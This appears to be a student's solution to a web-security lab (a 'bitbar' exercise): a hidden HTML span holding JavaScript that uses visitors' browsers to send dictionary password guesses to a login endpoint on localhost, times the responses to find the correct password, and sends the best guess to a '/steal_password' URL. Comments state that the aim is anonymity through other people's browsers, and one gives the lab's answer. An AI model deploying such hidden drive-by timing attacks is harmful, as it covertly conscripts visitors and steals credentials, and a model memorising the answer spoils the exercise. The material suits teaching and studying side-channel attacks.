<span style='display:none'>
  <img id='test'/>
  <script>
    // ANSWER: dragon, which takes by far the longest

    // we're using the browsers of people who visit this website to
    // make requests to bitbar and measure time it takes
    // this allows us to stay anonymous / not be blocked

    // Questions
    // - why are the timings off? where should i declare start & end Date objects?

    var dictionary = [`password`, `123456`, `12345678`, `dragon`, `1234`, `qwerty`, `12345`];
    var dictLen = dictionary.length;
    
    var index = 0;

    var test = document.getElementById(`test`);

    var start;
    var end;

    var slowestPwdTime = -1;
    var bestGuess = "";

    test.onerror = () => {

      if (index < dictLen) {
        var currPasswd = dictionary[index];
        
        var urlParams = `username=userx&password=` + currPasswd;

        test.src = `http://localhost:3000/get_login?` + urlParams;

        end = new Date();

        /* >>>> HINT: you might want to replace this line with something else. */
        var duration = end.getMilliseconds()-start.getMilliseconds();
        
        if (duration > slowestPwdTime) {
          bestGuess = currPasswd;
          slowestPwdTime = duration;
        }

      } else {
        // send guess to the server
        var url = `http://localhost:3000/steal_password?password=` + bestGuess + `&timeElapsed=` + slowestPwdTime;
        
        var xhr = new XMLHttpRequest();
        xhr.open("GET", url);
        xhr.send();

        // here, you'd want to break from loop
      }
      
      index += 1;
    };

    start = new Date();

    // purposefully wrong URL so we trigger onerror() continuously
    // when we've tried all passwds we send request to our website

    // but how do we break from this loop?
    test.src = `http://localhost:3000/nonexistent`;
  </script>
</span>

<!-- GRAVEYARD

- if i want to store all times & analyze in else{} 
var timings = {};
for (let i = 0; i < dictLen; i++) {
  var key = dictionary[i];
  if (timings[key] > slowestPwdTime) {
    console.log("key: ", key);
    bestGuess = key;
  }
}
timings[currPasswd] = duration; -->
